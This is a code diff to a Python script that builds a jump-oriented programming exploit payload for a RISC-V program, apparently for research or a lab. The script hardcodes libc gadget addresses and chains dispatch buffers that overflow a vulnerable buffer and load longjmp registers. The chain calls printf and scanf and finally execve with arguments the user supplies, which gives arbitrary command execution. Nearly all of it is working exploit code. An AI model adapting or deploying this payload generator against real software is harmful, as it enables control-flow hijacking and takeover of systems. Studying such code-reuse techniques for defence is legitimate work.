@@ -2,6 +2,22 @@ import argparse
 import ast
 import binascii
 
+def str_to_hexvalues(string):
+    buf = []
+    # Null terminate the string
+    nullt = string + '\0'
+    # Add more null terminators until the string is 8-byte aligned
+    for i in range(len(nullt) % 8, 8):
+        nullt += '\0'
+
+    # Store the hexademical values of the string in the buffer
+    for i in range(int(len(nullt) / 8)):
+        # Convert this 8-byte slice of a string to an integer - reverse the the byte order
+        hexstring = binascii.hexlify(bytes(nullt[i*8:(i+1)*8], 'ascii')[::-1])
+        hexvalue = int(hexstring, 16)
+        buf.append(hexvalue)
+    return buf
+
 # Abstract buffer class for printing/size
 class buffer:
     def __str__(self):
@@ -11,10 +27,11 @@ class buffer:
 
 # Buffer full of zeros
 class zeroBuf(buffer):
-    def __init__(self, words = None, bytelen = None):
+    def __init__(self, address, words = None, bytelen = None):
         if bytelen is not None:
             words = int(bytelen / 8)
         self.buf = [0 for i in range(words)]
+        self.address = address
 
 # Buffer with string array
 class stringArrayBuf(buffer):
@@ -27,19 +44,9 @@ class stringArrayBuf(buffer):
         for index, string in enumerate(strings):
             # Store the pointer to where this string's data will start
             self.buf[index] = address + (len(self.buf)*8)
-
-            # Null terminate the string
-            nullt = string + '\0'
-            # Add more null terminators until the string is 8-byte aligned
-            for i in range(len(nullt) % 8, 8):
-                nullt += '\0'
-            
-            # Store the hexademical values of the string in the buffer
-            for i in range(int(len(nullt) / 8)):
-                # Convert this 8-byte slice of a string to an integer - reverse the the byte order
-                hexstring = binascii.hexlify(bytes(nullt[i*8:(i+1)*8], 'ascii')[::-1])
-                hexvalue = int(hexstring, 16)
-                self.buf.append(hexvalue)
+            hexvalues = str_to_hexvalues(string)
+            for h in hexvalues:
+                self.buf.append(h)
 
 # longjmp buffer containing registers to load
 class longjmpBuf(buffer):
@@ -121,6 +128,14 @@ class dispatchBuf(buffer):
         self.buf[18] = s2
     def set_s3(self, s3):
         self.buf[19] = s3
+    def set_s4(self, s4):
+        self.buf[20] = s4
+    def set_s5(self, s5):
+        self.buf[21] = s5
+    def set_s6(self, s6):
+        self.buf[22] = s6
+    def set_s7(self, s7):
+        self.buf[23] = s7
 
 # Helper function to print strings by chaining calls to putchar
 def print_string(string, bufs):
@@ -143,6 +158,18 @@ mv_s3_to_t0_jalr_a3 = 0x200007be24
 mv_s0_to_a3_jalr_s9 = 0x200004b38c
 execve = 0x20000ad180
 putchar = 0x2000080bcc
+printf = 0x200006a48c
+fprintf = 0x200006a44a
+sprintf = 0x200006a51e
+scanf = 0x200006a63a
+mv_a3s2_a2s7_a1s6_a0s3_jalr_s1 = 0x2000096722
+ld_s1_to_a1_jalr_s7 = 0x20000596ba
+ld_s0_to_a5_a1_jalr_a5 = 0x20000e8b56
+ld_s0_to_a1_jalr_a5 = 0x20000e8b58  # moves s1 to a0
+mv_a1_to_s8_jalr_a5 = 0x20000f810a
+mv_a1_to_s8_jalr_s6 = 0x20000bffe2
+mv_s8_to_a2_jalr_s4 = 0x200004c7f0
+mv_s6_to_a0_jalr_s5 = 0x200008356a
 
 # Unused pointers
 bin_sh_str = 0x20001178a8
@@ -186,9 +213,167 @@ if args.msg != None and args.msg != '':
     # Add more dispatch buffers to chain calls to putchar
     print_string(args.msg + '\n', bufs)
 
-# Add a buffer with the array of strings following the putchars
+# Jop Chain to call printf() with three format specifiers (4 args)
+pbuf = dispatchBuf(bufs[-1])
+printfvalues = str_to_hexvalues('\nsubs:\n\t%%d:\t%d\n\t%%x:\t%x\n\t%%s:\t%s\n\n')
+substrvalues = str_to_hexvalues('a string')
+j = 20
+bufs_offset = 22
+printfstr_pointer = pbuf.dispatch_buf + 8*(j + bufs_offset)
+for i in range(len(printfvalues)):
+    pbuf.buf[j] = printfvalues[i]
+    j = j + 1
+substr_pointer = pbuf.dispatch_buf + 8*(j + bufs_offset)
+for i in range(len(substrvalues)):
+    pbuf.buf[j] = substrvalues[i]
+    j = j + 1
+pbuf.set_t1(printf)
+# printf() string
+pbuf.set_a0(printfstr_pointer)
+# printf() format specifiers
+pbuf.set_a1(13371337)
+pbuf.set_a2(0xdeadbeef)
+pbuf.set_a3(substr_pointer)
+pbuf.set_sp(bufs[-3].dispatch_buf)
+pbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
+pbuf.set_s1(mv_s3_to_t0_jalr_a3)
+pbuf.set_s2(load_regs_from_t0)
+
+bufs.append(pbuf)
+
+# Jop chain 
+printBuf = dispatchBuf(bufs[-1])
+printBuf.set_t1(mv_s3_to_t0_jalr_a3)
+printBuf.set_a3(printf)
+strvalues = str_to_hexvalues('Type in your your name: ')
+for i in range(len(strvalues)):
+    printBuf.buf[i + 20] = strvalues[i]
+printBuf.set_a0(printBuf.dispatch_buf + 336) # buf[20]
+printBuf.set_sp(bufs[-2].dispatch_buf)
+printBuf.set_ra(load_regs_from_t0)
+bufs.append(printBuf)
+
+
+# Jop Chain to call scanf() (read a string)
+scanbuf = zeroBuf(address=bufs[-1].next_dispatch_buf, words=256)
+bufs[-1].set_s3(scanbuf.address + scanbuf.size() - 176)
+sbuf = dispatchBuf(scanbuf.address + scanbuf.size())
+scanfvalues = str_to_hexvalues('%s')
+scanstr_pointer = scanbuf.address + scanbuf.size() - 80
+j = 20
+bufs_offset = 22
+scanfstr_pointer = sbuf.dispatch_buf + 8*(j + bufs_offset)
+for i in range(len(scanfvalues)):
+    sbuf.buf[j] = scanfvalues[i]
+    j = j + 1
+sbuf.set_t1(scanf)
+sbuf.set_a0(scanfstr_pointer)
+sbuf.set_a1(scanstr_pointer)
+sbuf.set_sp(bufs[-3].dispatch_buf)
+# Jop Chain to call scanf() (read a string)
+sbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
+sbuf.set_s1(mv_s3_to_t0_jalr_a3)
+sbuf.set_s2(load_regs_from_t0)
+
+bufs.append(scanbuf)
+bufs.append(sbuf)
+
+printBuf = dispatchBuf(bufs[-1])
+printBuf.set_t1(mv_s3_to_t0_jalr_a3)
+printBuf.set_a3(printf)
+strvalues = str_to_hexvalues('Type in a number: ')
+for i in range(len(strvalues)):
+    printBuf.buf[i + 20] = strvalues[i]
+printBuf.set_a0(printBuf.dispatch_buf + 336) # buf[20]
+printBuf.set_sp(scanbuf.address - 1024)
+printBuf.set_ra(load_regs_from_t0)
+bufs.append(printBuf)
+
+
+# Jop Chain to call scanf() (read a number)
+sbuf = dispatchBuf(bufs[-1])
+scanfvalues = str_to_hexvalues('%d')
+scanint_pointer = scanstr_pointer - 8
+j = 20
+bufs_offset = 22
+scanfstr_pointer = sbuf.dispatch_buf + 8*(j + bufs_offset)
+for i in range(len(scanfvalues)):
+    sbuf.buf[j] = scanfvalues[i]
+    j = j + 1
+sbuf.set_t1(scanf)
+sbuf.set_a0(scanfstr_pointer)
+sbuf.set_a1(scanint_pointer)
+sbuf.set_sp(scanbuf.address - 512)
+sbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
+sbuf.set_s1(mv_s3_to_t0_jalr_a3)
+sbuf.set_s2(load_regs_from_t0)
+# Jop Chain to call scanf() (read a number)
+
+bufs.append(sbuf)
+
+# Jop Chain to call printf() on the scanned string
+stringbuf = zeroBuf(address=bufs[-1].next_dispatch_buf, words=32)
+bufs[-1].set_s3(stringbuf.address + stringbuf.size() - 176)
+pbuf = dispatchBuf(stringbuf.address + stringbuf.size())
+printfvalues = str_to_hexvalues('\tYou entered this name: %s\n')
+printfstr_pointer = stringbuf.address
+for i in range(len(printfvalues)):
+    stringbuf.buf[i] = printfvalues[i]
+pbuf.set_t1(printf)
+pbuf.set_a0(printfstr_pointer)
+pbuf.set_a1(scanstr_pointer)
+pbuf.set_sp(scanbuf.address - 512)
+pbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
+pbuf.set_s1(mv_s3_to_t0_jalr_a3)
+pbuf.set_s2(load_regs_from_t0)
+# Jop Chain to call printf() on the scanned string
+bufs.append(stringbuf)
+bufs.append(pbuf)
+
+
+# Jop Chain to call printf() on number that were entered
+stringbuf = zeroBuf(address=bufs[-1].next_dispatch_buf, words=32)
+bufs[-1].set_s3(stringbuf.address + stringbuf.size() - 176)
+pbuf = dispatchBuf(stringbuf.address + stringbuf.size())
+printfvalues = str_to_hexvalues('\tYou typed this number: %1$d\n\t\t  Hexadecimal: 0x%1$x\n')
+printfstr_pointer = stringbuf.address
+for i in range(len(printfvalues)):
+    stringbuf.buf[i] = printfvalues[i]
+pbuf.set_s0(scanint_pointer - 16)
+pbuf.set_s4(scanint_pointer + 72 - 16) # make s4 match stack pointer check
+pbuf.set_t1(ld_s0_to_a1_jalr_a5)       # clobbers a0 with s1
+pbuf.set_a5(mv_s6_to_a0_jalr_s5)
+pbuf.set_s6(printfstr_pointer)
+pbuf.set_s5(printf)
+pbuf.set_sp(scanint_pointer - 16 - 96)
+pbuf.set_s2(load_regs_from_t0)
+pbuf.set_s1(mv_s3_to_t0_jalr_a3)
+pbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
+
+# Stackbuf for printf - to continue the jop chain
+scanbuf.buf[-14] = mv_a3s2_a2s7_a1s6_a0s3_jalr_s1    # ra
+scanbuf.buf[-15] = 0x1111111111111111                # s0
+scanbuf.buf[-16] = mv_s3_to_t0_jalr_a3               # s1
+scanbuf.buf[-17] = load_regs_from_t0                 # s2
+scanbuf.buf[-18] = pbuf.next_dispatch_buf - 176      # s3
+bufs.append(stringbuf)
+bufs.append(pbuf)
+
+printBuf = dispatchBuf(bufs[-1])
+printBuf.set_t1(mv_s3_to_t0_jalr_a3)
+printBuf.set_a3(printf)
+strvalues = str_to_hexvalues('\nContinuing JOP to execve call\n\n')
+for i in range(len(strvalues)):
+    printBuf.buf[i + 20] = strvalues[i]
+printBuf.set_a0(printBuf.dispatch_buf + 336) # buf[20]
+printBuf.set_sp(scanbuf.address - 1024)
+printBuf.set_ra(load_regs_from_t0)
+bufs.append(printBuf)
+
+
 execve_strbuf = stringArrayBuf(bufs[-1].next_dispatch_buf, args.execve)
-# Have the last putchar jump past this string buffer
+
+# Have the last gadget jump past this string buffer
 bufs[-1].set_s3(execve_strbuf.address + execve_strbuf.size() - 176)
 bufs.append(execve_strbuf)
 
@@ -202,7 +387,9 @@ final_buf.set_a2(0)
 final_buf.set_t1(execve)
 bufs.append(final_buf)
 
+
 # Compute the size of the dispatch buffer and check if they will fit
+
 dispatchbufs_size = sum(buf.size() for buf in bufs)
 remaining_size = args.buffer_size - dispatchbufs_size
 if remaining_size < 0:
@@ -217,7 +404,7 @@ for buf in bufs:
 
 # Fill the remaining part of the vulnerable buffer with zeros
 if remaining_size > 0:
-    empty_buf = zeroBuf(bytelen=remaining_size)
+    empty_buf = zeroBuf(address=bufs[-1].next_dispatch_buf, bytelen=remaining_size)
     dispatch_file.write(str(empty_buf))
 
 # Buffer for registers to be loaded by longjmp
